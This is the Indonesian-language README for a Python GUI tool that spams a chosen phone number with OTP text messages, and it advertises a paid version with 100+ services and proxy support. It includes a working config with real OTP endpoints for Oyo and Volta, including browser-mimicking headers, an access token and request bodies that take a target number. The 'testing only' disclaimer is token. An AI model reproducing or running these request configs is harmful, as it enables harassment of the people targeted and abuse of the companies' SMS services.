# 📱🔥 SPAM OTP GUI - README 🔥📱

Halo bro! 👋 Ini adalah aplikasi SPAM OTP keren dengan GUI yang kece pake Python 🐍. Buat yang mau ngirim OTP ke nomor tertentu (buat testing doang ya, jangan disalahgunakan 😉).

## 🚀 Fitur-Fitur Keren
- 💻 Tema warna ala Discord biar aesthetic ✨
- 🔐 Sistem login pake kode validasi biar aman
- 🌐 Auto cek koneksi internet biar ga error
- 📲 Support 3 format nomor (local, internasional, +62)
- ⚡ Multi-threading biar ga nge-freeze
- 📜 Log history buat liat hasil pengiriman
- 🛑 Tombol stop buat berhentiin kapan aja

## 🛠️ Cara Pake
1. **Login Dulu** 🔒  
   - Masukin kode validasi yang bener  
   - Kalo bener, langsung masuk ke menu utama  

2. **Masukin Nomor Target** 📱  
   - Isi nomor yang mau dikirimin OTP (contoh: 8123456789)  

3. **Gaspol!** 🚀  
   - Klik tombol "KIRIM" buat mulai spam  
   - Klik "STOP" kalo udah cukup  

4. **Liat Hasil** 📜  
   - Semua log pengiriman bakal muncul di textbox bawah  

## ⚠️ Peringatan
- Jangan disalahgunakan ya bro! 🙏  
- Ini cuma buat testing doang  
- Kalo internet mati, bakal muncul notif  

## 💻 Teknis
- Pake library `tkinter` buat GUI-nya  
- Ada multithreading biar ga lag  
- Ambil config dari GitHub biar fleksibel  

## 🔧 Contoh Config OTP (otp_config.json)
```json
[
    {
        "name": "Oyo",
        "method": "post",
        "url": "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
        "data": "{\"phone\": \"target_number\", \"country_code\": \"+62\", \"country_iso_code\": \"ID\", \"nod\": \"4\", \"send_otp\": \"true\", \"devise_role\": \"Consumer_Guest\"}",
        "headers": {
            "Host": "identity-gateway.oyorooms.com",
            "consumer_host": "https://www.oyorooms.com",
            "accept-language": "id",
            "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "Accept-Encoding": "gzip,deflate,br"
        }
    },
    {
        "name": "Volta",
        "method": "post",
        "url": "https://auth-production.voltaindonesia.com/v1/client/request-otp",
        "data": "{\"phoneNumber\": \"target_number\"}",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9,id;q=0.8",
            "content-type": "application/json",
            "origin": "https://voltaindonesia.com",
            "referer": "https://voltaindonesia.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
        }
    }
]
```
## 💰 Mau Versi Full OTP?

[![Telegram](https://img.shields.io/badge/🛒_BELI_FULL_OTP-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/Yoshcc)

Fitur versi full:
- ✅ 100+ layanan OTP terupdate
- 🔄 Auto update config otomatis
- 📊 Statistik pengiriman real-time
- 🛡️ Support proxy & multi-threading
- 🔥 Fitur-fitur premium lainnya

### Penjelasan Config:
- `name` : Nama layanan yang mau di-spam (e.g. Oyo, Volta)
- `url` : Endpoint API untuk request OTP
- `data` : Payload yang dikirim (pake placeholder `target_number` yang bakal diganti)
- `headers` : Header request biar mirip request asli dari browser/app

## 🎨 Tampilan
![Preview GUI]  
(Warna gelap ala Discord, ada tombol warna-warni, log history, dll)

## 📝 Catatan
Creator: **Yosepwdd**  
Dibuat pake ❤️ dan Python  

Yang mau modif silahkan, tapi jangan lupa kasih credit ya 😘  

```bash
# Cara jalanin:
python spam_otp.py
```

Semoga bermanfaat! Kalo ada error, jangan nangis ya 😂  
Peace out! ✌️